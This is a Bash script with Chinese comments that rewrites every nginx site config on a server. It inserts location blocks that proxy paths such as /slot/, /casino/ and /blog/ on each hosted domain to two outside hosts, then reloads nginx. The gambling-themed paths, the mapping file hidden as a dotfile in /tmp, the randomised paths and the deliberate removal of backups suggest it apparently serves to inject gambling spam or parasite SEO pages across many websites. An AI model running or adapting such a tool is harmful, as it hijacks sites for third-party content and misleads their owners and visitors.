#!/bin/bash
# nginx_per_domain_group.sh v3.7 无备份精简版（已移除所有备份功能）
# 核心功能完全保留，仅仅删除了备份相关的代码

NGINX_DIR="/etc/nginx/sites-enabled"
COM_PATHS=("help" "news" "page" "blog" "about" "support" "info")
IN_PATHS=("pg" "pgslot" "slot" "game" "casino" "live")
GLOBAL_MAP="/tmp/.domain_group_map.conf"
RESULT_LIST=$(mktemp)
NEW_RECORDS=$(mktemp)
MAX_TRIES=200

> "$GLOBAL_MAP" 2>/dev/null || exit 1
> "$RESULT_LIST"
> "$NEW_RECORDS"

# ==================== 模板（已统一修复 X-Forwarded-For） ====================
COM_TEMPLATE=$(cat <<'EOF'
    location /%PATH%/ {
        set $fullurl "$scheme://$host$request_uri";
        rewrite ^/%PATH%/?(.*)$ /index.php?domain=$fullurl&$args break;
        proxy_set_header Host xzz.pier46.com;
        proxy_set_header X-Real-IP $remote_addr;
        proxy_set_header X-Forwarded-For $proxy_add_x_forwarded_for;
        proxy_set_header X-Forwarded-Proto $scheme;
        proxy_set_header User-Agent $http_user_agent;
        proxy_set_header Referer $http_referer;
        proxy_ssl_server_name on;
        proxy_pass http://xzz.pier46.com;
    }
EOF
)

IN_TEMPLATE=$(cat <<'EOF'
    location /%PATH%/ {
        set $fullurl "$scheme://$host$request_uri";
        rewrite ^/%PATH%/?(.*)$ /index.php?domain=$fullurl&$args break;
        proxy_set_header Host ide.hashbank8.com;
        proxy_set_header X-Real-IP $remote_addr;
        proxy_set_header X-Forwarded-For $proxy_add_x_forwarded_for;
        proxy_set_header X-Forwarded-Proto $scheme;
        proxy_set_header User-Agent $http_user_agent;
        proxy_set_header Referer $http_referer;
        proxy_ssl_server_name on;
        proxy_pass http://ide.hashbank8.com;
    }
EOF
)

# ==================== 加载历史映射 ====================
declare -A HIST_MAP
while IFS=':' read -r hash path backend; do
    [[ -n "$hash" ]] && HIST_MAP["$hash"]="$path:$backend"
done < "$GLOBAL_MAP"

echo "=== Nginx 域名组路径分配器（v3.7 无备份精简版）==="
echo

global_modified=0

while IFS= read -r -d '' file; do
    [[ ! -f "$file" ]] && continue
    echo "→ 正在处理：$(basename "$file")"

    modified=0
    temp_new=$(mktemp)

    # csplit 分割所有 server{} 块
    csplit -z -f "/tmp/block_" "$file" '/^server[[:space:]]*{/' '{*}' >/dev/null 2>&1 || {
        echo " csplit 失败，跳过此文件"
        rm -f "$temp_new"
        continue
    }

    for block_file in /tmp/block_*; do
        [[ ! -s "$block_file" ]] && continue

        # === 超级精准提取 server_name（完全不受注释、折行、分号后注释影响）===
        domains=$(awk '
            /^[[:space:]]*server_name/ && !/^[[:space:]]*#/ {
                gsub(/^[[:space:]]*server_name[[:space:]]+/, "")
                gsub(/;.*$/, "")
                gsub(/#.*$/, "")
                gsub(/[[:space:]]+$/, "")
                if (NF > 0) print
            }
        ' "$block_file" | tr ' \t' '\n' | grep -v '^$' | sort -u)

        if [[ -z "$domains" ]]; then
            cat "$block_file" >> "$temp_new"
            rm -f "$block_file"
            continue
        fi

        # 跳过 301/302 重定向块
        if grep -qiE "return[[:space:]]+30[12]" "$block_file"; then
            cat "$block_file" >> "$temp_new"
            rm -f "$block_file"
            continue
        fi

        domain_key=$(printf '%s\n' "$domains" | sort -u | tr '\n' ' ' | sed 's/[[:space:]]*$//')
        hash=$(printf '%s' "$domain_key" | tr ' ' '_' | md5sum | awk '{print $1}')

        # 全局防重
        if [[ -n "${HIST_MAP[$hash]}" ]]; then
            cat "$block_file" >> "$temp_new"
            rm -f "$block_file"
            continue
        fi

        # 判断后端
        if grep -qE '\.(in|id)\b' <<< "$domain_key"; then
            backend="ide.hashbank8.com"
            template="$IN_TEMPLATE"
            pool=("${IN_PATHS[@]}")
        else
            backend="xzz.pier46.com"
            template="$COM_TEMPLATE"
            pool=("${COM_PATHS[@]}")
        fi

        # 随机选路径（防冲突）
        tries=0
        path=""
        while (( tries++ < MAX_TRIES )); do
            candidate="${pool[$RANDOM % ${#pool[@]}]}"
            if ! grep -q ":$candidate:$backend$" "$GLOBAL_MAP" && \
               ! grep -q ":$candidate:$backend$" "$NEW_RECORDS"; then
                path="$candidate"
                break
            fi
        done

        if [[ -z "$path" ]]; then
            echo " 路径池已耗尽（$backend），跳过此域名组"
            cat "$block_file" >> "$temp_new"
            rm -f "$block_file"
            continue
        fi

        # 记录新分配
        printf '%s:%s:%s\n' "$hash" "$path" "$backend" >> "$NEW_RECORDS"
        printf '%s\t%s\t%s\n' "$domain_key" "$path" "$backend" >> "$RESULT_LIST"

        # 生成 location 块并插入
        location_block=$(printf '%s' "$template" | sed "s/%PATH%/$path/g")
        { head -n -1 "$block_file"; echo "$location_block"; echo "}"; } >> "$temp_new"

        echo " 新增 → /$path/ → $backend ($domain_key)"
        modified=1
        global_modified=1
        rm -f "$block_file"
    done

    if (( modified )); then
        mv "$temp_new" "$file"
        echo " $(basename "$file") 已更新"
    else
        rm -f "$temp_new"
    fi

    rm -f /tmp/block_*
done < <(find "$NGINX_DIR" -type f -name "*.conf" -print0 2>/dev/null)

# ==================== 更新全局映射 ====================
[[ -s "$NEW_RECORDS" ]] && {
    cat "$NEW_RECORDS" >> "$GLOBAL_MAP"
    sort -u "$GLOBAL_MAP" -o "$GLOBAL_MAP"
}

# ==================== 重载 Nginx ====================
if (( global_modified )); then
    if nginx -t >/dev/null 2>&1; then
        nginx -s reload && echo "Nginx 已成功重载"
    else
        echo "Nginx 配置语法错误！请手动检查！"
        exit 1
    fi
else
    echo "本次无任何修改，无需重载 Nginx"
fi

# ==================== 输出结果 ====================
echo
echo "============================================================================"
echo " 本次新增域名组分配结果"
echo "============================================================================"
if [[ ! -s "$RESULT_LIST" ]]; then
    echo " 本次无新增（全部命中历史记录）"
else
    column -t -s $'\t' "$RESULT_LIST" | awk '{printf " %-56s → /%-10s → %s\n", $1, $2, $3}'
fi
echo "============================================================================"
echo "当前全局已管理 $(wc -l < "$GLOBAL_MAP") 个域名组"
echo "历史映射文件：$GLOBAL_MAP"
echo

rm -f "$RESULT_LIST" "$NEW_RECORDS"
exit 0
